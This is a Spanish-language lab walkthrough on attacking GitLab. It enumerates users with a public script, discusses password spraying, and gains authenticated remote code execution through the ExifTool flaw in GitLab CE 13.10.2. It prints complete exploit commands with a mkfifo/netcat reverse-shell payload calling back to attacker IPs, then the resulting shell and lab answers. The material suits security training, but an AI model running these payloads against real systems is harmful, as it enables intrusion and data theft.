
# GitLab - Ataques

Como vimos en la sección anterior, incluso el acceso no autenticado a una instancia de GitLab podría provocar la vulneración de datos confidenciales. Si pudiéramos obtener acceso como usuario válido de la empresa o administrador, podríamos descubrir datos suficientes para comprometer por completo la organización de alguna manera. GitLab tiene [553 CVE](https://www.cvedetails.com/vulnerability-list/vendor_id-13074/Gitlab.html) reportados a septiembre de 2021. Si bien no todos son explotables, ha habido varios graves a lo largo de los años que podrían provocar la ejecución remota de código.

***

## <mark style="color:purple;">Enumeración de usuarios</mark>

Aunque GitLab no lo considera una vulnerabilidad, como se ve en su página [de Hackerone](https://hackerone.com/gitlab?type=team) ("Enumeración de usuarios y proyectos/divulgación de rutas a menos que se pueda demostrar un impacto adicional"), sigue siendo algo que vale la pena verificar, ya que podría resultar en acceso si los usuarios seleccionan contraseñas débiles. Podemos hacer esto manualmente, por supuesto, pero los scripts hacen que nuestro trabajo sea mucho más rápido. Podemos escribir uno nosotros mismos en Bash o Python o usar [este](https://www.exploit-db.com/exploits/49821) para enumerar una lista de usuarios válidos. La versión Python3 de esta misma herramienta se puede encontrar [aquí](https://github.com/dpgg101/GitLabUserEnum) .&#x20;

Al igual que con cualquier tipo de ataque de password spraying, debemos tener en cuenta el bloqueo de cuentas y otros tipos de interrupciones. Los valores predeterminados de GitLab están configurados en 10 intentos fallidos que resultan en un desbloqueo automático después de 10 minutos. Esto se puede ver [aquí](https://gitlab.com/gitlab-org/gitlab-ce/blob/master/config/initializers/8_devise.rb) . Esto se puede cambiar, pero GitLab tendría que compilarse por fuente. En este momento, no hay forma de cambiar esta configuración desde la interfaz de usuario de administrador, pero un administrador puede modificar la longitud mínima de la contraseña, lo que podría ayudar a los usuarios a elegir contraseñas cortas y comunes, pero no mitigará por completo el riesgo de ataques de contraseña.

```shell-session
# Number of authentication tries before locking an account if lock_strategy
# is failed attempts.
config.maximum_attempts = 10

# Time interval to unlock the account if :time is enabled as unlock_strategy.
config.unlock_in = 10.minutes
```

Al descargar el script y ejecutarlo en la instancia de GitLab de destino, vemos que hay dos nombres de usuario válidos `root`(la cuenta de administrador integrada) y `bob`. Si logramos extraer una lista grande de usuarios, podríamos intentar un ataque de rociado de contraseñas controlado con contraseñas débiles y comunes como `Welcome1` o `Password123`, etc., o intentar reutilizar las credenciales obtenidas de otras fuentes, como volcados de contraseñas de violaciones de datos públicos.

```shell-session
afsh4ck@kali$ ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  			             GitLab User Enumeration Script
   	    			             Version 1.0

Description: It prints out the usernames that exist in your victim's GitLab CE instance

Disclaimer: Do not run this script against GitLab.com! Also keep in mind that this PoC is meant only
for educational purpose and ethical use. Running it against systems that you do not own or have the
right permission is totally on your own risk.

Author: @4DoniiS [https://github.com/4D0niiS]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


LOOP
200
[+] The username root exists!
LOOP
302
LOOP
302
LOOP
200
[+] The username bob exists!
LOOP
302
```

***

## <mark style="color:purple;">Ejecución remota de código autenticado</mark>

Las vulnerabilidades de ejecución remota de código suelen considerarse las "mejores", ya que el acceso al servidor subyacente probablemente nos otorgará acceso a todos los datos que residen en él (aunque es posible que primero debamos aumentar los privilegios) y puede servir como punto de apoyo en la red para que lancemos más ataques contra otros sistemas y potencialmente resulte en un compromiso total de la red. GitLab Community Edition versión 13.10.2 y anteriores sufrieron una [vulnerabilidad](https://hackerone.com/reports/1154542) de ejecución remota de código autenticada debido a un problema con ExifTool al manejar metadatos en archivos de imagen cargados. GitLab solucionó este problema con bastante rapidez, pero es probable que algunas empresas sigan usando una versión vulnerable. Podemos usar este [exploit](https://www.exploit-db.com/exploits/49951) para lograr la ejecución remota de código.

Como se trata de una ejecución remota de código autenticada, primero necesitamos un nombre de usuario y una contraseña válidos. En algunos casos, esto solo funcionaría si pudiéramos obtener credenciales válidas a través de OSINT o un ataque de adivinación de credenciales. Sin embargo, si encontramos una versión vulnerable de GitLab que permita el autorregistro, podemos registrarnos rápidamente para obtener una cuenta y llevar a cabo el ataque.

```shell-session
afsh4ck@kali$ python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '

[1] Authenticating
Successfully Authenticated
[2] Creating Payload 
[3] Creating Snippet and Uploading
[+] RCE Triggered !!
```

Y obtenemos un shell casi instantáneamente.

```shell-session
afsh4ck@kali$ nc -lnvp 8443

listening on [any] 8443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054

git@app04:~/gitlab-workhorse$ id

id
uid=996(git) gid=997(git) groups=997(git)

git@app04:~/gitlab-workhorse$ ls

ls
VERSION
config.toml
flag_gitlab.txt
sockets
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.21.88 (ACADEMY-ATCKAPPS-APP04) 

vHosts necesarios:
gitlab.inlanefreight.local
```

### Pregunta 1

> Busca otro usuario válido en la instancia de GitLab de destino.

Vamos a usar este script en bash para enumerar usuarios de GitLab:

{% embed url="<https://www.exploit-db.com/exploits/49821>" %}

```bash
bash gitlab_user_enum.sh --url gitlab.inlanefreight.local:8081 --userlist /usr/share/seclists/Usernames/cirt-default-usernames.txt   

LOOP
302
LOOP
302
LOOP
200
[+] The username DEMO exists!
302
LOOP
200
[+] The username bob exists!
302
LOOP
200
[+] The username root exists!
```

Encontramos al nuevo usuario DEMO.

### Pregunta 2

> Obtén ejecución remota de código en la instancia de GitLab. Envía la flag al directorio en el que se encuentra.

Vamos a usar este exploir para conseguir la ejecución remota de código:

{% embed url="<https://www.exploit-db.com/exploits/49951>" %}

```bash
python3 49951.py -t http://gitlab.inlanefreight.local:8081 -u hacker2 -p password1 -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.15.127 4444 >/tmp/f"

[1] Authenticating
Successfully Authenticated
[2] Creating Payload 
[3] Creating Snippet and Uploading
```

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.15.127] from (UNKNOWN) [10.129.201.88] 59062
bash: cannot set terminal process group (1303): Inappropriate ioctl for device
bash: no job control in this shell
git@app04:~/gitlab-workhorse$ id
id
uid=996(git) gid=997(git) groups=997(git)
```

<figure><img src="/files/PwVYGTERdGfzrUTjFfcb" alt=""><figcaption></figcaption></figure>

Tenemos una shell! Enumeramos el directorio actual y encontramos la flag:

```bash
git@app04:~/gitlab-workhorse$ ls
ls
VERSION
config.toml
flag_gitlab.txt
sockets
git@app04:~/gitlab-workhorse$ cat flag_gitlab.txt
cat flag_gitlab.txt
s3cure_***************
```
